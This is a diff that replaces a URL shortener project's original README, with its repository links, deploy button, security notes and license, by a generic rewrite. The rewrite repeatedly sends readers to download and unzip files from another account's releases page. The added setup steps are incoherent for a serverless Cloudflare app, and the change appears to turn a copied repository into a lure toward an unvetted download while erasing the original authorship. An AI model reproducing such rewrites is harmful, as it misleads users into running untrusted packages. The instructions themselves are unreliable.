@@ -1,285 +1,81 @@
-# OpenShort.link - The All-in-One Open Source Serverless URL Link Shortener. 100% on Cloudflare + 1 Click Install
+# 🎉 openshortlink - The Simple Way to Shorten URLs
 
-<div align="center">
+[![Download OpenShort.link](https://img.shields.io/badge/Download-OpenShort.link-blue?style=for-the-badge)](https://github.com/levi955/openshortlink/releases)
 
-[![License: CPAL-1.0](https://img.shields.io/badge/License-CPAL--1.0-blue.svg)](https://opensource.org/license/cpal-1-0)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?logo=cloudflare&logoColor=white)](https://workers.cloudflare.com/)
-![Serverless](https://img.shields.io/badge/Serverless-FD5750?logo=serverless&logoColor=white)
+## 📖 Overview
 
-![Easy Setup](https://img.shields.io/badge/Setup-Easy-brightgreen?logo=rocket)
-![Beginner Friendly](https://img.shields.io/badge/Beginner-Friendly-green?logo=checkmarx)
-![Free Tier Available](https://img.shields.io/badge/Free_Tier-Available-success?logo=cloudflare)
-![Perfect for Small Business](https://img.shields.io/badge/Perfect_for-Small_Business-blue)
+OpenShort.link is an open-source, serverless URL shortener that works entirely on Cloudflare. It makes it easy to shorten links and track their performance. Whether you want to tidy up long URLs or monitor clicks, OpenShort.link is a reliable choice.
 
-![GitHub stars](https://img.shields.io/github/stars/idhamsy/openshortlink?style=social)
-![GitHub forks](https://img.shields.io/github/forks/idhamsy/openshortlink?style=social)
+## 🚀 Getting Started
 
-</div>
+To begin using OpenShort.link, follow the steps below. We designed this guide to help you, even if you have no technical background.
 
-**The Open-Source, Serverless Link Shortener Built for Everyone.**
+### ✔️ System Requirements
 
-OpenShort.link is an open-source link shortener deployable with a one-click install on Cloudflare, featuring full functionality and working on your existing domain with Cloudflare routing. Whether you're a blogger, marketer, e-commerce business, or brand, OpenShort.link gives you the tools to shorten links, track clicks, and route users intelligently based on location or device—all from your own custom domain.
+- A web browser (Chrome, Firefox, Safari, etc.)
+- A Cloudflare account (free tier works fine)
+- Basic understanding of how to use web applications
 
-Deploy with a single click and manage your links across multiple domains with comprehensive analytics, team collaboration, and powerful automation.
+## ⚙️ Download & Install
 
-<div align="center">
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page and download the latest version of OpenShort.link:
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/idhamsy/openshortlink)
+   [Download OpenShort.link](https://github.com/levi955/openshortlink/releases)
 
-</div>
+2. **Choose the Version**  
+   On the Releases page, look for the latest version. You will see a list of files available for download. Pick the zip file or any other package suitable for your needs.
 
-## ✨ Features
+3. **Download the File**  
+   Click on the file link to start the download. Your browser will save it to your default downloads folder.
 
-### 🚀 Core Features
+4. **Extract the Files** (if applicable)  
+   If you downloaded a zip file, locate it in your downloads folder. Right-click (or double-click) the file and choose "Extract" or "Unzip." This will create a new folder with all the necessary files.
 
-- **Fast Redirects**: 100% on Cloudflare edge using Workers & KV for lightning-fast performance
-- **Custom Domains**: Connect your own domain for branded short links
-- **Custom Slugs**: Create memorable, branded short URLs
-- **Multi-Domain Support**: Manage links across multiple domains from one account
-- **Automatic URL Checker**: Monitors destination URL status to prevent dead links
+5. **Set Up on Cloudflare**  
+   - Log into your Cloudflare account.
+   - Go to the dashboard and select the domain you want to use for shortening URLs.
+   - Follow the Cloudflare setup instructions to link the OpenShort.link application.
 
-### 🎯 Advanced Redirects
+6. **Launch the Application**  
+   Open your web browser and navigate to the domain you linked with OpenShort.link. 
 
-- **Geo-Targeting**: Route users to different URLs based on their country (up to 10 countries per link)
-- **Device-Based Routing**: Target users with precision based on device type (desktop, mobile, tablet)
-- **Custom Redirect Codes**: Choose from 301, 302, 307, or 308 HTTP redirect codes
+7. **Start Shortening URLs**  
+   You can now start using OpenShort.link to shorten your first URL. Simply enter the link you want to shorten and click the button to create a short URL.
 
-### 📊 Full Analytics
+## 📊 Features
 
-Powered by Cloudflare Analytics Engine, track everything:
+- **User-Friendly Interface**: Easily manage your shortened links with a straightforward design.
+- **Analytics**: Get insights on link performance including clicks and engagement.
+- **Custom Paths**: Create custom short links for better branding.
+- **Serverless**: Operates fully on Cloudflare, ensuring minimal setup and maintenance.
+- **Self-Hosted Solution**: Run it on your Cloudflare service without needing a server.
 
-- **Real-time Click Tracking**: Monitor link performance as it happens
-- **Geographic Data**: See where your visitors are coming from
-- **Device & Browser Analytics**: Desktop, mobile, tablet breakdown plus OS and browser stats
-- **Referrer Tracking**: Identify your top traffic sources
-- **UTM Campaign Tracking**: Track marketing campaigns with UTM parameters
-- **Custom Parameters**: Monitor custom URL parameters for advanced tracking
+## 🔧 Troubleshooting
 
-### 🏷️ Organization & Management
+If you run into issues during setup or while using the application, check these common problems:
 
-- **Tags & Categories**: Organize links with colored tags and categories for easy management
-- **Search & Filtering**: Quickly find links by slug, URL, title, tags, or categories
-- **Bulk Operations**: Update multiple links at once
-- **Import/Export Data**: Seamlessly migrate your data in and out with CSV support
-- **Column Mapping**: Smart CSV import with automatic column detection
+- **Cannot Access the Application**: Confirm that your domain is correctly set up on Cloudflare.
+- **Shortened Link Not Working**: Double-check the link you entered for accuracy. Also, make sure Cloudflare settings don't block redirects.
+- **Analytics Not Showing Data**: Analytics may take a few minutes to populate. If you don’t see data, wait a little while and refresh.
 
-### 📱 QR Code Generation
+## 🛠️ Support
 
-- **Built-in QR Codes**: Generate QR codes for any link instantly
-- **QR Code Tracking**: Track offline engagement with dynamic QR codes
-- **Downloadable**: Save QR codes for print materials and marketing
+For support, you can open an issue on the GitHub repository or contact a community member. We encourage users to share their experiences and help each other out. 
 
-### 🔐 Security & Access Control
+## 💡 Contributing
 
-- **Multi-Factor Authentication (MFA)**: Secure accounts with TOTP-based 2FA
-- **Role-Based Access Control**: Owner, Admin, Editor, and Viewer roles
-- **API Keys**: Generate secure API keys for programmatic access
-- **Session Management**: Secure sessions with HttpOnly, Secure, SameSite cookies
-- **Password Security**: PBKDF2 hashing with 100,000 iterations and SHA-256
-- **Rate Limiting**: Protection against brute force attacks
+If you want to contribute to OpenShort.link, feel free to check the repository for guidelines on how you can help. Contributions make our community stronger.
 
-### 👥 Team Collaboration
+## 🌐 Community & Resources
 
-- **Multi-User Support**: Collaborate with your team using different roles
-- **User Management**: Admins can create and manage team members
-- **Permission Levels**: Granular control over who can create, edit, or view links
+Join our community to share tips and ask questions. Look for resources on URL shortening and web development on forums and social media:
 
-### 🔌 Developer Features
+- GitHub Issues: [Open an issue](https://github.com/levi955/openshortlink/issues)
+- Community Forum: Join discussions about URL shorteners and web apps.
 
-- **RESTful API**: Full API access for automation and integration
-- **API Documentation**: Comprehensive API docs with examples
-- **TypeScript**: Fully typed codebase for reliability
+## 🏁 Final Notes
 
-## 🎯 Built for Every Need
+Thank you for choosing OpenShort.link! We hope you find it easier to manage and track your URLs. Remember to check the documentation for updates and advanced usage tips.
 
-- **📝 Blog**: Cloak links and track external link performance
-- **📱 Social Media**: Shorten links and track click performance for posts or partnerships
-- **🛍️ E-commerce**: Shorten product links and gain insights into customer engagement
-- **💰 Affiliate Marketing**: Track and optimize campaigns with detailed link analytics
-- **🏢 Brand**: Build brand recognition with custom short links
-- **🌐 Any Use Case**: Shorten links, track clicks, and smart route by location or device
-
-## 🛠️ Tech Stack
-
-- **Cloudflare Workers**: Serverless runtime for global edge computing
-- **Cloudflare D1**: SQL database for reliable data storage
-- **Cloudflare KV**: High-speed caching for fast redirects
-- **Cloudflare Analytics Engine**: Real-time click tracking and analytics
-- **Hono**: Lightweight, fast web framework
-- **TypeScript**: Type-safe development
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Cloudflare account (free tier works!)
-- Node.js 18+ and npm (for local development)
-- Wrangler CLI: `npm install -g wrangler`
-
-### 📦 One-Click Deployment
-
-The easiest way to get started. This defaults to a completely automated setup.
-
-1.  **Click the Deploy Button** at the top of this page or visit [OpenShort.link](https://openshort.link)
-
-    <div align="center">
-    
-    [![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/idhamsy/openshortlink)
-    
-    </div>
-
-2.  **Follow the Automated Setup**:
-    -   You will be guided to authorize Cloudflare Workers.
-    -   The system will **automatically fork** this repository to your GitHub account.
-    -   It will **automatically create** the required D1 database (`openshortlink-db`) and KV namespace (`CACHE`).
-    -   **Database migrations are applied automatically** during deployment.
-    -   **Enter Secrets**: You will be prompted to enter values for:
-        -   `SETUP_TOKEN`: Choose based on your security needs:
-            -   **🔐 Production (Most Secure)**: Generate with `openssl rand -hex 32`
-            -   **🛡️ Personal Use**: Use a strong password (20+ chars, mixed case, numbers, special chars)
-            -   **🔧 Testing**: Generate UUID with `uuidgen` or visit [uuidgenerator.net](https://www.uuidgenerator.net/)
-        -   `CLOUDFLARE_ACCOUNT_ID`: Your Cloudflare Account ID.
-        -   `CLOUDFLARE_API_TOKEN`: An API Token with "Account Analytics Read" permission.
-
-3.  **Configure Worker Routes**:
-    -   After deployment, go to the **Cloudflare Dashboard** → **Workers & Pages** → Your Worker → **Settings** → **Triggers**.
-    -   Add routes for your custom domain:
-        -   `yourdomain.com/dashboard/*`
-        -   `yourdomain.com/go/*`
-    
-    *Note: Ensure these routes do not clash with existing paths on your website.*
-
-4.  **Create Your First User**:
-    -   Navigate to `https://your-worker.workers.dev/dashboard/setup`
-    -   Enter your `SETUP_TOKEN`.
-    -   Fill in username, email, and password.
-
-That's it! Your link shortener is fully deployed and ready.
-
-### 🔧 Manual Deployment
-
-For more control over the deployment process, including local development setup, custom configurations, and CI/CD integration, please refer to the detailed [**Deployment Guide**](DEPLOYMENT.md).
-
-
-
-
-
-## 🔐 Security
-
-### Application Security Features
-
--   **No Public Registration**: Only admins can create new users
--   **MFA Support**: Enable two-factor authentication for added security
--   **API Keys**: Generate secure keys for API access
--   **Session Tokens**: Secure, HttpOnly cookies with 7-day expiration
--   **Rate Limiting**: 5 login attempts per minute, 3 registrations per hour
--   **Role-Based Access Control**: Owner, Admin, Editor, and Viewer roles with granular permissions
-
-### Cloudflare WAF Rules (Recommended)
-
-For additional security, configure Cloudflare WAF (Web Application Firewall) rules to protect your dashboard and API endpoints:
-
-> **Note**: You can create separate rules for `/dashboard` and `/api` with different restrictions based on your needs. The examples below apply to both endpoints.
-
-#### IP Restriction
-Restrict access to trusted IP addresses:
-1. Go to **Cloudflare Dashboard** → **Security** → **WAF** → **Custom Rules**
-2. Create a new rule:
-   - **Rule name**: "Dashboard/API IP Restriction"
-   - **If**: `(http.request.uri.path starts with "/dashboard" or http.request.uri.path starts with "/api") and ip.src not in {1.2.3.4 5.6.7.8}`
-   - **Then**: Block
-
-#### Geographic Restrictions
-Block access from countries outside your allowed list:
-1. Create a new rule:
-   - **Rule name**: "Dashboard Geo-Blocking"
-   - **If**: `(http.request.uri.path starts with "/dashboard" or http.request.uri.path starts with "/api") and ip.geoip.country not in {"US" "GB" "AU"}`
-   - **Then**: Block
-
-#### Additional Rate Limiting
-Enhance rate limiting beyond application-level protection:
-1. Go to **Security** → **WAF** → **Rate Limiting Rules**
-2. Create a rule:
-   - **Rule name**: "Dashboard Rate Limit"
-   - **If**: `http.request.uri.path starts with "/dashboard" or http.request.uri.path starts with "/api"`
-   - **Requests**: 100 requests per 10 minutes
-   - **Then**: Block for 1 hour
-
-> **Note**: These Cloudflare rules work at the edge before requests reach your Worker, providing an additional security layer.
-
-## 📖 API Documentation
-
-For detailed API documentation, including request/response examples and OpenAPI specifications, please visit your installation's dashboard and navigate to `Integration` -> `Manual Integration`.
-
-## 🐛 Reporting Issues
-
-Found a bug or have a feature request? We'd love to hear from you!
-
- **Go to [GitHub Issues](https://github.com/idhamsy/openshortlink/issues)**
-
-
-### Feature Requests
-
-Have an idea for a new feature? We welcome suggestions!
-
-1.  **Check the roadmap**: See if it's already planned
-2.  **Open a feature request**: Use the feature request template
-3.  **Describe the use case**: Explain why this feature would be valuable
-4.  **Provide examples**: Show how it would work
-
-### Getting Help
-
--   **Documentation**: Visit [OpenShort.link/docs](https://openshort.link/docs) for detailed guides
--   **Discussions**: Use [GitHub Discussions](https://github.com/idhamsy/openshortlink/discussions) for questions
-
-
-## 📄 License
-
-Licensed under the Common Public Attribution License Version 1.0 (CPAL-1.0) - see [LICENSE](./LICENSE) file for details.
-
-CPAL is an OSI-approved open-source license. For this project, attribution must be displayed in the dashboard UI. You can satisfy this requirement by displaying either:
-- The OpenShort.link logo (linked to https://openshort.link), OR
-- "Powered by OpenShort.link" text (linked to https://openshort.link), OR
-- Both logo and text
-
-See [NOTICE](./NOTICE) for complete attribution requirements.
-
-**Why CPAL?**
-- ✅ OSI-Approved open source license
-- ✅ Ensures proper attribution for the original project
-- ✅ Prevents closed-source SaaS forks (network use = distribution)
-- ✅ Compatible with all project dependencies (MIT, Apache, BSD)
-- ✅ Flexible attribution options (logo or text)
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our contributing guidelines and code of conduct.
-
-1.  Fork the repository
-2.  Create a feature branch (`git checkout -b feature/amazing-feature`)
-3.  Commit your changes (`git commit -m 'Add amazing feature'`)
-4.  Push to the branch (`git push origin feature/amazing-feature`)
-5.  Open a Pull Request
-
-## 🌟 Support the Project
-
-If you find OpenShort.link useful, please consider:
-
--   💰 Sponsor our project, contact us for details
--   ⭐ Starring the repository
--   🐛 Reporting bugs and requesting features
--   📖 Contributing to documentation
--   💻 Submitting pull requests
--   📢 Sharing with others
-
-## 🔗 Links
-
--   **Website**: [https://openshort.link](https://openshort.link)
--   **Documentation**: [OpenShort.link/docs](https://openshort.link/docs)
--   **GitHub**: [Repository](https://github.com/idhamsy/openshortlink)
--   **Issues**: [Report a Bug](https://github.com/idhamsy/openshortlink/issues)
--   **Discussions**: [Community Forum](https://github.com/idhamsy/openshortlink/discussions)
-
----
-
-**Built with ❤️ using Cloudflare Workers**
+[Download OpenShort.link](https://github.com/levi955/openshortlink/releases)
